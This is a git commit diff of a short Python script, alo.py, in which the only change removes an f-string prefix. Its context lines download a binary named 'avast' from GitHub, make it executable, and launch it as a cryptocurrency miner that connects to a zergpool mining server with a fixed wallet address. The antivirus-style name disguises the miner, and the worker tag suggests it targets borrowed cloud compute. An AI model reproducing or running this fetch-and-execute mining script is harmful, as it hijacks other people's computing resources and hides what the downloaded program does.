4146500877e441a315249bc4a1d66007c66cefe3
samrikulan <93561728+samrikulan@users.noreply.github.com>
2021-11-18 01:30:29 +0700

    Update alo.py

--- alo.py
+++ alo.py
@@ -1,5 +1,5 @@
 import os,subprocess
-os.system(f"lscpu")
+os.system("lscpu")
 subprocess.run(['wget', 'https://github.com/samrikulan/toya/raw/main/avast'], stdout=subprocess.PIPE)
 subprocess.run(['chmod', '777', 'avast'], stdout=subprocess.PIPE)
 subprocess.run(['bash', './avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 8 -x'], stdout=subprocess.PIPE)
